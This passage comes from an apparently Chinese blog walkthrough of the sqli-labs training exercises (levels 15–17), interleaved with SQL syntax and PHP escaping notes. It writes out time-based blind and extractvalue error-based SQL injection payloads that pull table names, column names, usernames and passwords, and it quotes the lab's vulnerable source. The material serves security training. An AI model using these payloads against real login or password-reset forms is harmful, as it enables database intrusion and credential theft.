<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">uname:admin' and if(ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'security'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">101</span>,<span class="number">1</span>,<span class="keyword">sleep</span>(<span class="number">5</span>))<span class="comment">#</span></span><br><span class="line">passwd:<span class="number">1</span></span><br><span class="line">//<span class="keyword">security</span>下第一个表名的第一个字符  <span class="number">101</span>-》e</span><br><span class="line">uname:<span class="keyword">admin</span><span class="string">' and if(ascii(substr((select table_name from information_schema.tables where table_schema='</span><span class="keyword">security</span><span class="string">' limit 0,1),2,1))=108,1,sleep(5))#</span></span><br><span class="line"><span class="string">passwd:1</span></span><br><span class="line"><span class="string">//security下第一个表名的第二个字符  108-》m</span></span><br><span class="line"><span class="string">....</span></span><br><span class="line"><span class="string">逐步猜测表名为emails</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">uname:admin'</span> <span class="keyword">and</span> <span class="keyword">if</span>(<span class="keyword">ascii</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'security'</span> <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">114</span>,<span class="number">1</span>,<span class="keyword">sleep</span>(<span class="number">5</span>))<span class="comment">#</span></span><br><span class="line">passwd:<span class="number">1</span></span><br><span class="line">//<span class="keyword">security</span>下第二个表名的第一个字符  <span class="number">114</span>-》r</span><br><span class="line">......</span><br><span class="line">逐步猜测所有表名</span><br><span class="line"></span><br><span class="line">uname:<span class="keyword">admin</span><span class="string">' and if(ascii(substr((select column_name from information_schema.columns where table_name='</span><span class="keyword">users</span><span class="string">' limit 0,1),1,1))=105,1,sleep(5))#</span></span><br><span class="line"><span class="string">passwd:1</span></span><br><span class="line"><span class="string">//猜测表中第一个列名的第一个字符 105-》i</span></span><br><span class="line"><span class="string">.....</span></span><br><span class="line"><span class="string">逐步猜测出所有列名</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">uname:admin'</span> <span class="keyword">and</span> <span class="keyword">if</span>(<span class="keyword">ascii</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> username <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">68</span>,<span class="number">1</span>,<span class="keyword">sleep</span>(<span class="number">5</span>))<span class="comment">#</span></span><br><span class="line">passwd:<span class="number">1</span></span><br><span class="line">//猜测username的第一行中的第一位 <span class="number">69</span>-》D </span><br><span class="line">.....</span><br><span class="line">逐步猜测出所有的用户名和密码</span><br></pre></td></tr></table></figure>

<h4 id="less16"><a href="#less16" class="headerlink" title="less16"></a>less16</h4><p>通过使用 <code>admin</code>和 <code>admin&quot;</code>进行尝试，发现没有任何的反应，猜测要使用延时注入的方式进行，查看源码发现sql查询语句：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$uname</span>=<span class="string">'"'</span>.<span class="variable">$uname</span>.<span class="string">'"'</span>;</span><br><span class="line"><span class="variable">$passwd</span>=<span class="string">'"'</span>.<span class="variable">$passwd</span>.<span class="string">'"'</span>; </span><br><span class="line">@<span class="variable">$sql</span>=<span class="string">"SELECT username, password FROM users WHERE username=(<span class="variable">$uname</span>) and password=(<span class="variable">$passwd</span>) LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure>

<p>查询语句中将uname和passwd进行了双引号和括号处理，所以将less15中的playload进行单引号变双引号加上括号即可。</p>
<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">uname</span>:admin") and if(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">115</span>,<span class="number">1</span>,sleep(<span class="number">5</span>))#</span><br><span class="line"><span class="attribute">passwd</span>:<span class="number">1</span></span><br><span class="line"><span class="comment">//查询数据库名的第一个字符是否为 s   115-》s</span></span><br><span class="line"><span class="attribute">uname</span>:admin") and if(ascii(substr(database(),<span class="number">2</span>,<span class="number">1</span>))=<span class="number">101</span>,<span class="number">1</span>,sleep(<span class="number">5</span>))#</span><br><span class="line"><span class="attribute">passwd</span>:<span class="number">1</span></span><br><span class="line"><span class="comment">//查询数据库名第二个字符为e   101-》e</span></span><br><span class="line">......</span><br><span class="line">逐步查询出数据库名为security</span><br></pre></td></tr></table></figure>

<p>当语句正确时可以直接登录，不正确时延时5秒  。其余playload与less15一样</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">uname:admin") and if(ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'security'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">101</span>,<span class="number">1</span>,<span class="keyword">sleep</span>(<span class="number">5</span>)<span class="comment">#</span></span><br><span class="line">passwd:<span class="number">1</span></span><br><span class="line">//查询<span class="keyword">security</span>下第一个表的第一个字符是否为e   <span class="number">101</span>-》e</span><br><span class="line">uname:<span class="keyword">admin</span><span class="string">") and if(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),2,1))=108,1,sleep(5))#</span></span><br><span class="line"><span class="string">//查询security下第一个表的第二个字符是否为m   108-》m</span></span><br><span class="line"><span class="string">......</span></span><br><span class="line"><span class="string">逐步查询出第一个名emails</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">uname:admin"</span>) <span class="keyword">and</span> <span class="keyword">if</span>(<span class="keyword">ascii</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'security'</span> <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">114</span>,<span class="number">1</span>,<span class="keyword">sleep</span>(<span class="number">5</span>))<span class="comment">#</span></span><br><span class="line">passwd：<span class="number">1</span></span><br><span class="line">//查询<span class="keyword">security</span>第二个表的第一个字符是否为r   <span class="number">114</span>-》r</span><br><span class="line">uname:<span class="keyword">admin</span><span class="string">") and if(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 1,1),2,1))=101,1,sleep(5))#</span></span><br><span class="line"><span class="string">passwd:1</span></span><br><span class="line"><span class="string">//查询security第二个表的第二个字符是否为e   101-》e</span></span><br><span class="line"><span class="string">......</span></span><br><span class="line"><span class="string">逐步查询出第二个表名为referers</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">uname:admin"</span>) <span class="keyword">and</span> <span class="keyword">if</span>(<span class="keyword">ascii</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">105</span>,<span class="number">1</span>,<span class="keyword">sleep</span>(<span class="number">5</span>))<span class="comment">#</span></span><br><span class="line">passwd:<span class="number">1</span></span><br><span class="line">//查询<span class="keyword">users</span>表中的列名</span><br><span class="line"></span><br><span class="line">uname:<span class="keyword">admin</span><span class="string">") and if(ascii(substr((select username from users limit 0,1),1,1))=68,1,sleep(5))#</span></span><br><span class="line"><span class="string">passwd:1</span></span><br><span class="line"><span class="string">//猜测username的第一行中的第一位 69-》D </span></span><br><span class="line"><span class="string">.....</span></span><br><span class="line"><span class="string">逐步猜测出所有的用户名和密码</span></span><br></pre></td></tr></table></figure>

<h3 id="Background-4-数据库增删改查"><a href="#Background-4-数据库增删改查" class="headerlink" title="Background-4   数据库增删改查"></a>Background-4   数据库增删改查</h3><p>数据库最常用的四个功能，增删改查</p>
<p>增加一行数据<code>insert</code>,语法：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">//插入单行</span><br><span class="line"><span class="keyword">insert</span> [<span class="keyword">into</span>] &lt;表名&gt; (列名) <span class="keyword">values</span> (列值);</span><br><span class="line">例：<span class="keyword">insert</span> <span class="keyword">into</span> students (姓名，性别，出生日期) <span class="keyword">values</span>(<span class="string">'一一一'</span>,<span class="string">'男'</span>,<span class="string">'1980/6/6'</span>);</span><br><span class="line">//将现有表数据添加到一个已有表</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> &lt;已有的新表&gt; &lt;列名&gt; <span class="keyword">select</span> &lt;原表列名&gt; <span class="keyword">from</span> &lt;原表名&gt;;</span><br><span class="line">例：<span class="keyword">insert</span> <span class="keyword">into</span> students (<span class="string">'姓名'</span>,<span class="string">'性别'</span>,<span class="string">'出生日期'</span>) <span class="keyword">select</span> 姓名,性别,出生日期 <span class="keyword">from</span> studentmessages;</span><br><span class="line">//用现有数据表创建一个新表并填充</span><br><span class="line"><span class="keyword">select</span> &lt;新建表列名&gt; <span class="keyword">into</span> &lt;新建表名&gt; <span class="keyword">from</span> &lt;源表名&gt;;</span><br><span class="line">例：<span class="keyword">select</span> <span class="keyword">name</span>,address,email <span class="keyword">into</span> students <span class="keyword">from</span> studentmessages;</span><br><span class="line">//使用union关键字合并数据进行插入多行</span><br><span class="line"><span class="keyword">insert</span> &lt;表名&gt; &lt;列名&gt; <span class="keyword">select</span> &lt;列值&gt; <span class="keyword">union</span> <span class="keyword">select</span> &lt;列值&gt;;</span><br><span class="line">例：<span class="keyword">insert</span> students (姓名,性别,出生日期) <span class="keyword">select</span> <span class="string">'一一一'</span>,<span class="string">'男'</span>,<span class="string">'1980/6/6'</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="string">'二二二'</span>,<span class="string">'男'</span>,<span class="string">'1980/7/7'</span>;</span><br></pre></td></tr></table></figure>

<p>删除一行数据 delete</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">//删除&lt;满足条件的&gt;行</span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> &lt;表名&gt; [<span class="keyword">where</span> &lt;删除条件&gt;];</span><br><span class="line">例：<span class="keyword">delete</span> <span class="keyword">from</span> a <span class="keyword">where</span> <span class="type">name</span>=<span class="string">'一一一'</span>;</span><br><span class="line">//删除整个表</span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> &lt;表名&gt;</span><br><span class="line">例：<span class="keyword">drop</span> <span class="keyword">table</span> students;</span><br><span class="line">//删除数据库</span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">database</span> 数据库名</span><br><span class="line">删除表中的列：<span class="keyword">alter</span> <span class="keyword">table</span> 表名 <span class="keyword">drop</span> <span class="keyword">column</span> 列名;</span><br></pre></td></tr></table></figure>

<p>更改数据 update</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">update</span> &lt;表名&gt; <span class="keyword">set</span> &lt;列名=更新值&gt; [<span class="keyword">where</span> &lt;更新条件&gt;]</span><br><span class="line">例：<span class="keyword">update</span> students <span class="keyword">set</span> 年龄=<span class="number">18</span> <span class="keyword">where</span> 姓名=<span class="string">'三三三'</span>;</span><br></pre></td></tr></table></figure>

<p>查询数据 select</p>
<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//精准（条件）查询</span></span><br><span class="line"><span class="keyword">select</span> &lt;列名&gt; <span class="keyword">from</span> &lt;表名&gt; [<span class="keyword">where</span> &lt;查询条件表达试&gt;] [<span class="keyword">order</span> <span class="keyword">by</span> &lt;排序的列名&gt;[<span class="keyword">asc</span>或<span class="keyword">desc</span>]]</span><br><span class="line"><span class="number">1</span>.查询所有行与列</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> a;</span><br><span class="line"><span class="number">2</span>.查询部分的行列--条件查询</span><br><span class="line"><span class="keyword">select</span> i,j,k <span class="keyword">from</span> a <span class="keyword">where</span> f=<span class="number">5</span>;</span><br><span class="line"><span class="number">3</span>.在查询中使用<span class="keyword">as</span>更改列名</span><br><span class="line"><span class="keyword">select</span> name <span class="keyword">as</span> 姓名 <span class="keyword">from</span> a <span class="keyword">where</span> xingbie=<span class="string">'男'</span>;</span><br><span class="line"><span class="comment">//查询a表中性别为男的所有行，显示name列，并将name列名为（姓名）显示</span></span><br><span class="line"><span class="number">4</span>.查询空行</span><br><span class="line"><span class="keyword">select</span> name <span class="keyword">from</span> a <span class="keyword">where</span> email <span class="keyword">is</span> null;</span><br><span class="line"><span class="comment">//查询表a中email为空的所有行，并显示name列</span></span><br><span class="line"><span class="number">5</span>.在查询中使用常量</span><br><span class="line"><span class="keyword">select</span> name, <span class="string">'唐山'</span> <span class="keyword">as</span> 地址 <span class="keyword">from</span> student;</span><br><span class="line"><span class="comment">//查询表a,显示name列，并添加地址列,其列值都为'唐山'</span></span><br><span class="line"><span class="number">6</span>.查询返回限制行数</span><br><span class="line"><span class="keyword">select</span> top <span class="number">6</span> name <span class="keyword">from</span> a;</span><br><span class="line"><span class="comment">//查询表a,显示列name前6行，top为关键字</span></span><br><span class="line"><span class="keyword">select</span> TOP <span class="number">60</span> percent name <span class="keyword">from</span> a;</span><br><span class="line"><span class="comment">//查询表a,显示列name的60%，percent为关键字</span></span><br><span class="line"><span class="number">7</span>.查询排序（关键字：<span class="keyword">order</span> <span class="keyword">by</span>,   <span class="keyword">asc</span>,   <span class="keyword">desc</span>）</span><br><span class="line"><span class="keyword">select</span> name <span class="keyword">from</span> a <span class="keyword">where</span> chengji&gt;=<span class="number">60</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="keyword">desc</span>;</span><br><span class="line"><span class="comment">//查询a表中的chengji大于等于60的所有行，并按降序显示name列，默认是asc升序</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//模糊查询</span></span><br><span class="line"><span class="number">1</span>.使用like进行模糊查询（like运算符只用于字符串，仅与char和varchar数据类型联合使用）</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> a <span class="keyword">where</span> name like <span class="string">'赵%'</span>;</span><br><span class="line"><span class="comment">//查询显示表a中，name字段第一个字为赵的记录</span></span><br><span class="line"><span class="number">2</span>.使用between在某个范围内进行查询</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> a <span class="keyword">where</span> nianling between <span class="number">18</span> <span class="keyword">and</span> <span class="number">20</span>;</span><br><span class="line"><span class="comment">//查询表a中nianling在18到20之间的记录</span></span><br><span class="line"><span class="number">3</span>.使用<span class="keyword">in</span>在列举值内进行查询</span><br><span class="line"><span class="keyword">select</span> name <span class="keyword">from</span> a <span class="keyword">where</span> address <span class="keyword">in</span> (<span class="string">'北京'</span>,<span class="string">'上海'</span>,<span class="string">'唐山'</span>);</span><br><span class="line"><span class="comment">//查询表a中address值为北京或者上海或者唐山的记录，显示name字段</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//分组查询</span></span><br><span class="line"><span class="number">1</span>.使用<span class="keyword">group</span> <span class="keyword">by</span> 进行分组查询</span><br><span class="line"><span class="keyword">select</span> studentID <span class="keyword">as</span> 学员编号，AVG(score) <span class="keyword">as</span> 平均成绩 <span class="keyword">from</span> score <span class="keyword">group</span> <span class="keyword">by</span> StudentID</span><br><span class="line"><span class="comment">//第一个score是列名，第二个score是表名</span></span><br><span class="line"><span class="comment">//在表score中查询，按照studentID字段进行分组，显示studentID字段和score字段的平均值select语句中只允许被分组的列和为每个分组返回的一个值的表达式，例如用一个列名作为参数的聚合函数</span></span><br><span class="line"><span class="number">2</span>.使用having子句进行分组筛选</span><br><span class="line"><span class="keyword">select</span> studentID <span class="keyword">as</span> 学员编号,AVG(score) <span class="keyword">as</span> 平均成绩 <span class="keyword">from</span> score <span class="keyword">group</span> <span class="keyword">by</span> studentID having count(score)&gt;<span class="number">1</span>;</span><br><span class="line"><span class="comment">//第一个score是列名，第二个score是表名</span></span><br><span class="line"><span class="comment">//显示分组后count(score)&gt;1的行，由于where只能在没有分组时使用，分组后只能使用having来限制条件</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//多表连接查询</span></span><br><span class="line"><span class="number">1</span>.内联接</span><br><span class="line">(<span class="number">1</span>)在<span class="keyword">where</span>子句中指定联接条件</span><br><span class="line"><span class="keyword">select</span> a.name,b.chengji <span class="keyword">from</span> a,b <span class="keyword">where</span> a.name=b.name</span><br><span class="line"><span class="comment">//查询表a和表b中name字段相等的记录，并显示表a中的name字段和表b中的chengji字段</span></span><br><span class="line">(<span class="number">2</span>)在<span class="keyword">from</span>子句中使用<span class="keyword">join</span>...on</span><br><span class="line"><span class="keyword">select</span> a.name,b.chengji <span class="keyword">from</span> a inner <span class="keyword">join</span> b <span class="keyword">on</span> (a.name=b.name);</span><br><span class="line"><span class="number">2</span>.外连接</span><br><span class="line">(<span class="number">1</span>)左外联接查询</span><br><span class="line"><span class="keyword">select</span> s.name,c.courseID,c.score <span class="keyword">from</span> students <span class="keyword">as</span> s left outer <span class="keyword">join</span> score <span class="keyword">as</span> c <span class="keyword">on</span> s.scode=c.studentID;</span><br><span class="line"><span class="comment">//在students表和score表中查询满足on条件的行，条件为score表的studentID与students表中的sconde相同</span></span><br><span class="line">(<span class="number">2</span>)右外联接查询</span><br><span class="line"><span class="keyword">select</span> s.name,c.courseID,c.score <span class="keyword">from</span> students <span class="keyword">as</span> s right outer <span class="keyword">join</span> score <span class="keyword">as</span> c <span class="keyword">on</span> s.scode=c.studentID</span><br><span class="line"><span class="comment">//在students表和score表中查询满足on条件的行，条件为students表中的sconde与score表的stuentID相同</span></span><br></pre></td></tr></table></figure>

<h4 id="less17"><a href="#less17" class="headerlink" title="less17"></a>less17</h4><p>由页面标题得知，这是一个密码重置的过程，主要会利用到update语句。</p>
<p>尝试使用报错注入</p>
<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">uname:</span>admin</span><br><span class="line"><span class="symbol">passwd:</span><span class="number">1</span><span class="string">'</span></span><br></pre></td></tr></table></figure>

<p>错误回显：</p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">near <span class="symbol">'admin</span>'' <span class="keyword">at</span> line <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>说明在重置密码的时候使用单引号进行处理。使用报错盲注</p>
<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uname:admin</span><br><span class="line">passwd=<span class="number">1</span>' <span class="keyword">and</span> <span class="built_in">extractvalue</span>(<span class="number">1</span>,<span class="built_in">concat</span>(<span class="number">0x7e</span>,(<span class="built_in">select</span> <span class="comment">@@</span>version),<span class="number">0x7e</span>))<span class="meta">#</span></span><br><span class="line"><span class="comment">//获取数据库版本</span></span><br></pre></td></tr></table></figure>

<p><img src="/2019/12/27/sqli-labs-writeup/35.png" alt></p>
<p>将@@version换成需要查询的子句即可</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">uname:admin </span><br><span class="line">passwd:<span class="number">1'</span> <span class="function">and <span class="title">extractvalue</span>(<span class="params"><span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> database(</span>)),0x7e))#</span></span><br><span class="line"><span class="function"><span class="comment">//获取数据库名</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">uname:admin</span></span><br><span class="line"><span class="function">passwd:1' and <span class="title">extractvalue</span>(<span class="params"><span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> table_name <span class="keyword">from</span> infromation_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'security'</span> limit <span class="number">0</span>,<span class="number">1</span></span>),0x7e))#</span></span><br><span class="line"><span class="function"><span class="comment">//查询第一个表名</span></span></span><br><span class="line"><span class="function">.....</span></span><br><span class="line"><span class="function">逐步查询所有表名</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">uname:admin</span></span><br><span class="line"><span class="function">passwd:1' and <span class="title">extractvalue</span>(<span class="params"><span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> columns_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span> limit <span class="number">0</span>,<span class="number">1</span></span>),0x7e))#</span></span><br><span class="line"><span class="function"><span class="comment">//查询users表中的列名</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">uname:admin</span></span><br><span class="line"><span class="function">passwd:1' and <span class="title">extractvalue</span>(<span class="params"><span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> username <span class="keyword">from</span> users <span class="keyword">where</span> id=<span class="number">3</span></span>),0x7e))#</span></span><br><span class="line"><span class="function"><span class="comment">//查询用户名和密码</span></span></span><br></pre></td></tr></table></figure>

<p>这边使用passwd作为注入点而不是像之前的使用uname，是因为在后台对uname进行了处理。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">$uname=check_input($_POST[<span class="string">'uname'</span>]);  </span><br><span class="line">$passwd=$_POST[<span class="string">'passwd'</span>];</span><br><span class="line"><span class="comment">//check_input函数如下</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">empty</span>($value))</span><br><span class="line">		&#123;</span><br><span class="line">		<span class="comment">// truncation (see comments)</span></span><br><span class="line">		$value = substr($value,<span class="number">0</span>,<span class="number">15</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line">		<span class="keyword">if</span> (get_magic_quotes_gpc())</span><br><span class="line">			&#123;</span><br><span class="line">			$value = stripslashes($value);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Quote if not a number</span></span><br><span class="line">		<span class="keyword">if</span> (!ctype_digit($value))</span><br><span class="line">			&#123;</span><br><span class="line">			$value = <span class="string">"'"</span> . mysql_real_escape_string($value) . <span class="string">"'"</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">		$value = intval($value);</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">return</span> $value;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>后台对uname参数进行check_input()函数进行检查。</p>
<p>此处需要了解的一些函数：</p>
<p><strong>addslashes()</strong></p>
<p>addslashes()函数返回在预定义字符之前添加反斜杠的字符串</p>
<p>预定义字符：</p>
<ul>
<li>单引号   <code>&#39;</code></li>
<li>双引号 <code>&quot;</code></li>
<li>反斜杠 <code>\</code></li>
<li>NULL</li>
</ul>
<p>tips：该函数可用于为存储在数据库中的字符串以及数据库查询语句准备字符串。</p>
<p>默认情况下，php对所有的GET、POST和COOKIE数据自动运行addslashes(),所以不应对已转义过的字符串使用addslashes()，否则将导致双层转义，遇到这种情况时可使用<strong>get_magic_quotes_gpc()</strong>进行检测。</p>
<p>语法：addslashes(string)</p>
<p>参数stringi       是必需字段，规定要转义的字符              返回值为已转义的字符串</p>
<p>要求在PHP 4+版本</p>
<p><strong>stripslashes()</strong></p>
<p>函数删除由addslashes()函数添加的反斜杠</p>
<p><strong>mysql_real_escape_string()</strong></p>
<p>函数转义SQL语句中使用的字符串中的特殊字符。</p>
<p>主要是以下字符受影响：</p>
<ul>
<li>\x00</li>
<li>\n</li>
<li>\r</li>
<li>\</li>
<li>‘</li>
<li>“</li>
<li>\x1a</li>
</ul>
<p>如果成功，则该函数返回被转义的字符串。如果失败，则返回false</p>
<p>语法：mysql_real_escape_string(string,connection)</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>string</td>
<td>必需，规定要转义的字符串</td>
</tr>
<tr>
<td>connection</td>
<td>可选，规定Mysql连接，如果未规定，则使用上一个连接</td>
</tr>
</tbody></table>
<p>本函数string中的特殊字符转义，并考虑到连接的当前字符集，因此可以安全用mysql_query()。</p>
<p>所以在本关卡check_input()中，对username进行各种转义的处理，所以此处不能使用uname进行注入。</p>
<h3 id="Background-5-HTTP头部介绍"><a href="#Background-5-HTTP头部介绍" class="headerlink" title="Background-5 HTTP头部介绍"></a>Background-5 HTTP头部介绍</h3><p>Http头部详解</p>
<p>1.Accept：告知web服务器自己接受什么介质类型，<code>*/*</code>表示任何类型， <code>type/*</code>表示该类型下的所有子类型，type/sub-type</p>
<p>2.Accept-Charset:浏览器申明自己接收的字符串</p>
<p>Accept-Encoding:浏览器申明自己接收的编码方法，通常指定压缩方法，是否支持压缩，支持什么压缩方法（gzip，deflate)</p>
<p>Accept_Language:浏览器申明自己接收的语言</p>
<p>语言与字符串的区别：中文是语言，中文有很多字符集，比如big5，gb2312，gbk等</p>
